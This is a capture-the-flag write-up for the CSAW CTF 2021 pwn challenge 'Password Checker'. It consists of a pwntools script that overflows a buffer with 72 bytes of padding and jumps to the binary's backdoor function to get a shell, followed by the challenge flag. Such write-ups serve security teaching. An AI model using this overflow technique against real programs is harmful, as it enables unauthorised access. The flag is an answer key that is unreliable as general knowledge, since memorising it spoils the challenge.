---
name: Password Checker (2021)
event: CSAW CTF 2021
category: Pwn
description: Writeup for Password Checker (pwn) - CSAW CTF (2021) 💜
layout:
    title:
        visible: true
    description:
        visible: true
    tableOfContents:
        visible: true
    outline:
        visible: true
    pagination:
        visible: true
---

# Password Checker

## Video Walkthrough

[![VIDEO](https://img.youtube.com/vi/1Dw21NoxXjE/0.jpg)](https://youtu.be/1Dw21NoxXjE?t=315s "CSAW 2021: Password Checker")

## Challenge Description

> Charlie forgot his password to login into his Office portal. Help him to find it.

## Solution

{% code overflow="wrap" %}
```py
from pwn import *

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

# Specify GDB script here (breakpoints etc)
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

# Binary filename
exe = './password_checker'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (warning/info/debug)
context.log_level = 'debug'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Pass in pattern_size, get back EIP/RIP offset
offset = 72

# Start program
io = start()

# Build the payload
payload = flat([
    offset * "A",
    elf.symbols.backdoor
])

# Save the payload to file
write('payload', payload)

# Send the payload
io.sendlineafter('>', payload)

# Got Shell?
io.interactive()
```
{% endcode %}

Flag: `flag{ch4r1i3_4ppr3ci4t35_y0u_f0r_y0ur_h31p}`
